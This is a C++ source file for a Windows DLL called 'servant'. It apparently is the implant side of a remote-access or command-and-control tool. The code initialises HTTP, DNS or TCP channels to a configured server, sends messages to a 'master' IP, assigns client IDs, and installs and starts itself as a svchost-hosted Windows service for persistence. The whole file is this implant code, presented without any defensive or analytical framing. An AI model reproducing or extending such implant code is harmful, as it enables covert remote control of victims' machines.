// servant.cpp : 定义 DLL 应用程序的导出函数。
//

#include "stdafx.h"
#include <Winsock2.h>
#include "tstring.h"
#include "CommManager.h"
#include "Manager.h"
#include "ServiceManager.h"
#include "main.h"
#include "common.h"

SERVANT_API BOOL InitServant(const PCONFIG_INFO pConfigInfo)
{
	debugLog(_T("init servant. server : %s"), a2t(pConfigInfo->szAddr));

	debugLog(a2t(pConfigInfo->szAddr));

	g_ConfigInfo = *pConfigInfo;

	if (! CommManager::GetInstanceRef().Init())
	{
		errorLog(_T("init commmgr failed"));
		return FALSE;
	}

	if (! Manager::GetInstanceRef().Init())
	{
		errorLog(_T("init servant manager failed"));
		return FALSE;
	}

	if (COMMNAME_HTTP == g_ConfigInfo.nDefaultCommType) CommManager::GetInstanceRef().SetDefaultComm(COMMNAME_HTTP);
	else if (COMMNAME_DNS == g_ConfigInfo.nDefaultCommType) CommManager::GetInstanceRef().SetDefaultComm(COMMNAME_DNS);
	else if (COMMNAME_TCP == g_ConfigInfo.nDefaultCommType) CommManager::GetInstanceRef().SetDefaultComm(COMMNAME_TCP);

	if (! CommManager::GetInstanceRef().StartMessageWorker(1000 * 30, 10, 1000))
	{
		errorLog(_T("start comm failed"));
		return FALSE;
	}

	//加载本地模块
//	ServantManager::GetInstanceRef().AddAllLocalModules();
 	
	return TRUE;
}

SERVANT_API void InstallService(LPCTSTR serviceName, LPCTSTR displayName, LPCTSTR descripion, LPCTSTR filepath, LPCTSTR svchostName)
{
	infoLog(_T("%s | %s | %s | %s | %s "),serviceName,displayName,descripion,filepath,svchostName);

	ServiceManager::GetInstanceRef().InstallSvchostService(serviceName,displayName,descripion,filepath,svchostName);
	ServiceManager::GetInstanceRef().StartService(serviceName);

}

SERVANT_API void DeinitServant()
{
	debugLog(_T("deinit servant"));

	CommManager::GetInstanceRef().Deinit();

	Manager::GetInstanceRef().Deinit();
}

SERVANT_API BOOL SendMsg( const LPBYTE pData, DWORD dwSize, COMM_NAME commname /*= COMMNAME_DEFAULT*/, ULONG targetIP /*= 0*/ )
{
	if (0 == targetIP)
	{
		targetIP = Manager::GetInstanceRef().GetMasterIP();
	}

	CommData commData;
	if (! commData.Parse(pData, dwSize))
	{
		errorLog(_T("parse data failed"));
		return FALSE;
	}

	CommManager::GetInstanceRef().PushMsgToMaster(commname, commData);

	return TRUE;
}

SERVANT_API GUID GetCID()
{
	return Manager::GetInstanceRef().GetClientID();
}

BOOL APIENTRY DllMain( HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
	)
{
// 	switch (ul_reason_for_call)
// 	{
// 	case DLL_PROCESS_ATTACH:
// 	case DLL_THREAD_ATTACH:
// 	case DLL_THREAD_DETACH:
// 	case DLL_PROCESS_DETACH:
//	}

	return TRUE;
}
